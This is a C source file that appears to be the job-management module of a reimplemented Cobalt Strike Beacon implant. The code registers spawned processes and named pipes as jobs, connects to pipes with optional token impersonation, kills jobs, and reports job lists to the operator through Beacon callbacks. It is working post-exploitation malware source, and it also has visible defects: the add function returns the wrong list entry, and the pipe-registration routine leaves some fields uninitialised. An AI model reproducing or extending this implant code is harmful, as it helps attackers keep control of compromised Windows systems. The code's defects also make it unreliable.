#include "pch.h"

#include "beacon.h"
#include "pipe.h"


typedef struct _JOB_ENTRY
{
	int id;
	HANDLE process;
	HANDLE thread;
	__int64 pid;
	HANDLE hRead;
	HANDLE hWrite;
	struct _JOB_ENTRY* next;
	SHORT isPipe;
	SHORT isDead;
	int pid32;
	DWORD callbackType;
	BOOL isMsgMode;
	char description[64];
} JOB_ENTRY;

JOB_ENTRY* gJobs = NULL;

JOB_ENTRY* JobAdd(JOB_ENTRY* newJob)
{
	static DWORD gJobCurrentId = 0;

	JOB_ENTRY* job = gJobs;
	newJob->id = gJobCurrentId++;

	// Add to the end of the list
	if (job)
	{
		while (job->next)
			job = job->next;

		job->next = newJob;
	}
	else
	{
		gJobs = newJob;
	}

	return job;
}

void JobCleanup()
{
	// Close handles associated with completed jobs
	// If gJobs is not empty, iterate through the list
	;
	for (JOB_ENTRY* job = gJobs; job; job = job->next)
	{
		if (job->isDead)
		{
			if (!job->isPipe)
			{
				CloseHandle(job->process);
				CloseHandle(job->thread);
				CloseHandle(job->hRead);
				CloseHandle(job->hWrite);
			} else
			{
				DisconnectNamedPipe(job->hRead);
				CloseHandle(job->hRead);
			}
		}
	}

	JOB_ENTRY* prev = NULL;
	JOB_ENTRY** pNext;
	for (JOB_ENTRY* job = gJobs; job; job = *pNext)
	{
		if (!job->isDead)
		{
			prev = job;
			pNext = &job->next;
			continue;
		}

		if (prev)
			pNext = &prev->next;
		else
			pNext = &gJobs;

		*pNext = job->next;
		free(job);
	}

}

void JobKill(char* buffer, int size)
{
	datap parser;
	BeaconDataParse(&parser, buffer, size);
	short id = BeaconDataShort(&parser);

	for (JOB_ENTRY* job = gJobs; job; job = job->next)
	{
		if (job->id == id)
			job->isDead = TRUE;
	}

	JobCleanup();
}

void JobPrintAll()
{
	formatp format;
	BeaconFormatAlloc(&format, 0x8000);

	for (JOB_ENTRY* job = gJobs; job; job = job->next)
	{
		BeaconFormatPrintf(&format, "%d\t%d\t%s\n", job->id, job->pid32, job->description);
	}

	int size = BeaconDataLength(&format);
	char* buffer = BeaconDataOriginal(&format);
	BeaconOutput(CALLBACK_JOBS, buffer, size);
	BeaconFormatFree(&format);
}

JOB_ENTRY* JobRegisterProcess(PROCESS_INFORMATION* pi, HANDLE hRead, HANDLE hWrite, char* description)
{
	JOB_ENTRY* job = (JOB_ENTRY*)malloc(sizeof(JOB_ENTRY));
	if (!job)
		return NULL;

	job->process = pi->hProcess;
	job->thread = pi->hThread;
	job->next = NULL;
	job->isPipe = FALSE;
	job->hRead = hRead;
	job->hWrite = hWrite;
	job->pid = pi->dwProcessId;
	job->callbackType = CALLBACK_OUTPUT;
	job->isMsgMode = FALSE;
	job->pid32 = pi->dwProcessId;
	strncpy(job->description, description, sizeof(job->description));

	return JobAdd(job);
}

JOB_ENTRY* JobRegisterPipe(HANDLE hRead, int pid32, int callbackType, char* description, BOOL isMsgMode)
{
	JOB_ENTRY* job = (JOB_ENTRY*)malloc(sizeof(JOB_ENTRY));
	if (!job)
		return NULL;


	job->hWrite = INVALID_HANDLE_VALUE;
	job->next = NULL;
	job->isMsgMode = isMsgMode;
	job->hRead = hRead;
	job->isPipe = TRUE;
	job->pid32 = pid32;
	job->callbackType = callbackType;
	strncpy(job->description, description, sizeof(job->description));

	return JobAdd(job);
}

void JobRegister(char* buffer, int size, BOOL impersonate, BOOL isMsgMode)
{
	char filename[64] = { 0 };
	char description[64] = { 0 };

	datap parser;
	BeaconDataParse(&parser, buffer, size);
	int pid32 = BeaconDataInt(&parser);
	short callbackType = BeaconDataShort(&parser);
	short waitTime = BeaconDataShort(&parser);

	if (!BeaconDataStringCopySafe(&parser, filename, sizeof(filename)))
		return;

	if (!BeaconDataStringCopySafe(&parser, description, sizeof(description)))
		return;

	HANDLE hPipe;
	int attempts = 0;
	while (!PipeConnectWithToken(filename, &hPipe, impersonate ? 0x20000 : 0))
	{
		Sleep(500);
		if(++attempts >= 20)
		{
			DWORD lastError = GetLastError();
			LERROR("Could not connect to pipe: %s", LAST_ERROR_STR(lastError));
			BeaconErrorD(ERROR_CONNECT_TO_PIPE_FAILED, lastError);
			return;
		}
	}

	if (waitTime)
	{
		PipeWaitForData(hPipe, waitTime, 500);
	}

	JobRegisterPipe(hPipe, pid32, callbackType, description, isMsgMode);
}